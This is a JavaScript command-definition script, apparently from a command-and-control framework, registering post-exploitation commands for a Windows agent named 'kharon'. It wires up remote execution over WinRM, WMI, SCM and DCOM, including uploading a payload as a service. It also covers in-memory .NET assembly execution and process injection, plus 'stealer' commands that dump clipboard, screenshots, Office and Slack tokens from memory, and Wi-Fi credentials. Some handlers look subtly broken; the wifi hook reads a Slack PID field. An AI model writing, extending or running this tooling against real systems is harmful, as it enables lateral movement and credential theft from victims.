// REMOTE EXEC

let cmd_rmt_exec_winrm = ax.create_command("winrm", "Execute command on remote machine using WinRM protocol", "remote-exec winrm -t 192.168.1.10 -c \"whoami\" -u admin -p pass", "Task: remote execution via WinRM");
cmd_rmt_exec_winrm.addArgFlagString("-t", "target", "Computer name or IP address", true);
cmd_rmt_exec_winrm.addArgFlagString("-c", "command", "Command to execute", true);
cmd_rmt_exec_winrm.addArgFlagString("-u", "username", "Username for authentication");
cmd_rmt_exec_winrm.addArgFlagString("-p", "password", "Password for authentication");
cmd_rmt_exec_winrm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target = parsed_json["target"] || "";
    let command = parsed_json["command"] || "";
    let username = parsed_json["username"] || "";  
    let password = parsed_json["password"] || ""; 
    
    let bof_params = ax.bof_pack("wstr,wstr,wstr,wstr", [target, command, username, password]);
    let bof_path   = ax.script_dir() + "bofs/dist/winrm_wsmanapi." + ax.arch(id) + ".o";
    let message    = "Task: remote exec winrm -> " + target + " " + command;
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

let cmd_rmt_exec_wmi = ax.create_command("wmi", "Execute command on remote machine using WMI Win32_Process", "remote-exec wmi -t DC01 -c \"cmd.exe /c whoami\" -u admin -p pass -d domain", "Task: remote execution via WMI");
cmd_rmt_exec_wmi.addArgFlagString("-t", "target", "Computer name or IP address", true);
cmd_rmt_exec_wmi.addArgFlagString("-c", "command", "Command to execute", true);
cmd_rmt_exec_wmi.addArgFlagString("-u", "username", "Username for authentication");
cmd_rmt_exec_wmi.addArgFlagString("-p", "password", "Password for authentication");
cmd_rmt_exec_wmi.addArgFlagString("-d", "domain", "Domain name");
cmd_rmt_exec_wmi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let full_cmdline = parsed_json["command"];
    
    let full_target = "\\\\" + parsed_json["target"] + "\\ROOT\\CIMV2";
    let is_current = (parsed_json["username"] && parsed_json["username"].length > 0) ? 0 : 1;
    let bof_params = ax.bof_pack("wstr,wstr,int,wstr,wstr,wstr", [
        parsed_json["target"], full_cmdline, is_current, parsed_json["domain"] || "", 
        parsed_json["username"] || "", parsed_json["password"] || ""
    ]);
    let bof_path = ax.script_dir() + "bofs/dist/wmi_win32_process_create." + ax.arch(id) + ".o";
    let message  = "Task: remote exec wmi -> " + parsed_json["target"] + " " + full_cmdline;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

let cmd_rmt_exec_scm = ax.create_command("scm", "Create and execute remote service using Service Control Manager", "remote-exec scm -t 192.168.1.10 -n MyService -p C:\\Temp\\payload.exe -f /local/binary.exe", "Task: remote execution via SCM");
cmd_rmt_exec_scm.addArgFlagString("-t", "target", "Computer name or IP address", true);
cmd_rmt_exec_scm.addArgFlagString("-n", "svc_name", "Service name to create", true);
cmd_rmt_exec_scm.addArgFlagString("-p", "svc_path", "Remote path for service binary", true);
cmd_rmt_exec_scm.addArgFlagFile("-f", "binary_file", "Local binary file to upload");
cmd_rmt_exec_scm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_params;
    if ( parsed_json["binary_file"] && parsed_json["binary_file"] != 0 ) {
        bof_params = ax.bof_pack("cstr,cstr,cstr,bytes", [parsed_json["target"], parsed_json["svc_name"], parsed_json["svc_path"], parsed_json["binary_file"]]);
    } else {
        bof_params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["target"], parsed_json["svc_name"], parsed_json["svc_path"]]);
    }
    
    let bof_path   = ax.script_dir() + "bofs/lateralmov/scm_create_service." + ax.arch(id) + ".o";
    let message    = "Task: remote exec scm -> " + parsed_json["target"] + " " + parsed_json["svc_name"] + " " + parsed_json["svc_path"];
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

let cmd_rmt_exec_dcom = ax.create_command("dcom", "Execute command on remote machine using DCOM objects", "remote-exec dcom -m MMC20.ExecuteShellCommand -t 192.168.1.10 -c \"notepad.exe\" -u admin -p pass -d domain", "Task: remote execution via DCOM");
cmd_rmt_exec_dcom.addArgFlagString("-m", "method", "DCOM method: 'MMC20.ExecuteShellCommand'", "MMC20.ExecuteShellCommand");
cmd_rmt_exec_dcom.addArgFlagString("-t", "target", "Computer name or IP address, is possible set 'localhost'", true);
cmd_rmt_exec_dcom.addArgFlagString("-c", "command", "Command to execute", true);
cmd_rmt_exec_dcom.addArgFlagString("-u", "username", "Username for authentication");
cmd_rmt_exec_dcom.addArgFlagString("-p", "password", "Password for authentication");
cmd_rmt_exec_dcom.addArgFlagString("-d", "domain", "Domain name");
cmd_rmt_exec_dcom.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_params;
    
    bof_params = ax.bof_pack("wstr,wstr,wstr,wstr,wstr,wstr", [
        parsed_json["method"] || "MMC20.ExecuteShellCommand", 
        parsed_json["target"], 
        parsed_json["command"], 
        parsed_json["username"] || "", 
        parsed_json["password"] || "", 
        parsed_json["domain"] || ""
    ]);
    
    let bof_path = ax.script_dir() + "bofs/dist/dcom_mmc_execshell." + ax.arch(id) + ".o";
    let message = "Task: remote exec dcom -> " + (parsed_json["method"] || "MMC20.ExecuteShellCommand");
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

let cmd_rmt_exec = ax.create_command("remote-exec", "Execute commands on remote machines via WMI, WinRM, SCM, or DCOM");
cmd_rmt_exec.addSubCommands([cmd_rmt_exec_winrm, cmd_rmt_exec_wmi, cmd_rmt_exec_scm, cmd_rmt_exec_dcom]);

// DOTNET

let cmd_dotnet_list_v = ax.create_command("listversions", "Enumerate installed .NET Framework versions using BOF", "dotnet listversions", "Task: enumerate .NET versions");
cmd_dotnet_list_v.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs/dist/list_versions." + ax.arch(id) + ".o";
    let message = "Task: enumerating installed .NET Framework versions";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
});

let cmd_dotnet_inline = ax.create_command("inline", "Execute .NET assembly in-process without spawning", "dotnet inline -f /tmp/Rubeus.exe -a \"kerberos\" -d RndDomain -v v4.0.30319", "Task: execute .NET assembly inline");
cmd_dotnet_inline.addArgFlagFile("-f", "dotnet_file", true, ".NET assembly file");
cmd_dotnet_inline.addArgFlagString("-a", "args", false, "Assembly arguments");
cmd_dotnet_inline.addArgFlagString("-d", "app_domain", false, "Application domain name");
cmd_dotnet_inline.addArgFlagString("-v", "dotnet_version", false, ".NET version");
cmd_dotnet_inline.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let dotnet_file = parsed_json["dotnet_file"];
    let args = parsed_json["args"] || "";
    let app_domain = parsed_json["app_domain"] || "RndDomain";
    let dotnet_version = parsed_json["dotnet_version"] || "v0.0.00000";

    let mod_params = ax.bof_pack("wstr,wstr,wstr,bytes", [args, app_domain, dotnet_version, dotnet_file]);
    let mod_path = ax.script_dir() + "postex_sc/dotnet_ldr/bin/dotnet_assembly." + ax.arch(id) + ".bin";
    let message = `Task: executing .NET assembly in-memory`;

    ax.execute_alias(id, cmdline, `execute postex --file ${mod_path} --args ${mod_params}`, message);
});

let cmd_dotnet_fork = ax.create_command("fork", "Execute .NET assembly in-process spawning or injecting in the existence process", "dotnet fork -m spawn -f /tmp/Rubeus.exe -a \"kerberos\" -d RndDomain -v v4.0.30319", "Task: execute .NET assembly inline");
cmd_dotnet_fork.addArgFlagString("-m", "method", false, "Method to use fork, choice 'explicit' need use fork_pid or 'spawn'");
cmd_dotnet_fork.addArgFlagInt("-P", "pid", false, "Pid to use for inject in the explicit method");
cmd_dotnet_fork.addArgFlagFile("-f", "dotnet_file", true, ".NET assembly file");
cmd_dotnet_fork.addArgFlagString("-a", "args", false, "Assembly arguments");
cmd_dotnet_fork.addArgFlagString("-d", "app_domain", false, "Application domain name");
cmd_dotnet_fork.addArgFlagString("-v", "dotnet_version", false, ".NET version");
cmd_dotnet_fork.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let method = parsed_json["method"];
    let fork_pid = parsed_json["pid"];
    let dotnet_file = parsed_json["dotnet_file"];
    let args = parsed_json["args"] || "";
    let app_domain = parsed_json["app_domain"] || "RndDomain";
    let dotnet_version = parsed_json["dotnet_version"] || "v0.0.00000";

    let mod_params = ax.bof_pack("wstr,wstr,wstr,bytes", [args, app_domain, dotnet_version, dotnet_file]);
    let mod_path = ax.script_dir() + "postex_sc/dotnet_ldr/bin/dotnet_assembly." + ax.arch(id) + ".bin";
    let message = `Task: executing .NET assembly in-memory`;

    ax.execute_alias(id, cmdline, `execute postex --method ${method} --pid ${fork_pid} --file ${mod_path} --args ${mod_params}`, message);
});

let cmd_dotnet = ax.create_command("dotnet", ".NET Framework operations - execute assemblies and enumerate versions");
cmd_dotnet.addSubCommands([cmd_dotnet_list_v, cmd_dotnet_inline, cmd_dotnet_fork]);

// STEALER

let cmd_stealer_screenshot = ax.create_command("screenshot", "Capture a screenshot of the current desktop", "stealer screenshot", "Task: capture desktop screenshot");
cmd_stealer_screenshot.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs/dist/screenshot." + ax.arch(id) + ".o";
    let message = "Task: capture screenshot";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
});

let cmd_stealer_clipdump = ax.create_command("clipdump", "Retrieve current clipboard contents", "stealer clipdump", "Task: dump clipboard data");
cmd_stealer_clipdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "bofs/dist/clipdump." + ax.arch(id) + ".o";
    let message = "Task: Dump clipboard from current user";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
});

let cmd_stealer_officedump = ax.create_command("office-dump", "Extract tokens from Microsoft Office process memory", "stealer office-dump 1234", "Task: dump token credentials from memory");
cmd_stealer_officedump.addArgInt("office_pid", true, "Process ID of running Office application");
cmd_stealer_officedump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let office_pid = parsed_json["office_pid"];

    let bof_params = ax.bof_pack("int", [office_pid]);
    let bof_path =  ax.script_dir() + "bofs/dist/office-dump." + ax.arch(id) + ".o";
    let message = `Task: dump office token from ${office_pid}`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});    

let cmd_stealer_slackdump = ax.create_command("slack-dump", "Extract token from Slack process memory", "stealer office-dump 1234", "Task: dump Slack token from memory");
cmd_stealer_slackdump.addArgInt("slack_pid", true, "Process ID of running Office application");
cmd_stealer_slackdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let slack_pid = parsed_json["slack_pid"];

    let bof_params = ax.bof_pack("int", [slack_pid]);
    let bof_path =  ax.script_dir() + "bofs/dist/slack-dump." + ax.arch(id) + ".o";
    let message = `Task: dump slack token from ${slack_pid}`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});    

let cmd_stealer_wifi = ax.create_command("wifi", "Enumerate or Dump wifi", "stealer wifi enum", "Task: interact with wifi");
cmd_stealer_wifi.addArgString("wifi_action", true, "Use 'enum' or 'dump [profile]'");
cmd_stealer_wifi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let slack_pid = parsed_json["slack_pid"];

    let bof_params = ax.bof_pack("int", [slack_pid]);
    let bof_path =  ax.script_dir() + "bofs/dist/wifidump." + ax.arch(id) + ".o";
    let message = `Task: interact with wifi`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});    

let cmd_stealer = ax.create_command("stealer", "Information gathering and credential extraction operations");
cmd_stealer.addSubCommands([cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_stealer_officedump, cmd_stealer_slackdump, cmd_stealer_wifi]);

var group_stealer  = ax.create_commands_group("Stealer Commands", [cmd_stealer]);
var group_dotnet   = ax.create_commands_group("Dotnet Interactions", [cmd_dotnet]);
var group_rmt_exec = ax.create_commands_group("Remote Execution", [cmd_rmt_exec]);

ax.register_commands_group(group_stealer , ["kharon"], ["windows"], []);
ax.register_commands_group(group_dotnet  , ["kharon"], ["windows"], []);
ax.register_commands_group(group_rmt_exec, ["kharon"], ["windows"], []);
